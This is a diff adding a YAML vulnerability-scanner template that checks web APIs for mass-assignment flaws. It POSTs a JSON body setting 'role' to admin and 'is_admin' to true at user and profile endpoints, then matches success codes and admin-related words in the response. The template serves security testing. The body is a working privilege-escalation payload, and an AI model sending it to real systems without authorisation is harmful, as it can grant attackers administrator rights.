@@ -1,0 +1,28 @@
+id: mass-assignment
+info:
+  name: Mass Assignment 漏洞检测
+  severity: high
+  description: 检测 Mass Assignment (批量赋值) 漏洞
+  tags: mass-assignment,api,high
+  author: poxiao
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/users"
+      - "{{BaseURL}}/api/users"
+      - "{{BaseURL}}/api/v1/profile"
+    headers:
+      Content-Type: "application/json"
+    body: '{"username":"test","email":"test@test.com","role":"admin","is_admin":true,"admin":true}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200, 201]
+      - type: word
+        words:
+          - "admin"
+          - "role"
+          - "is_admin"
+        condition: or
+        part: body
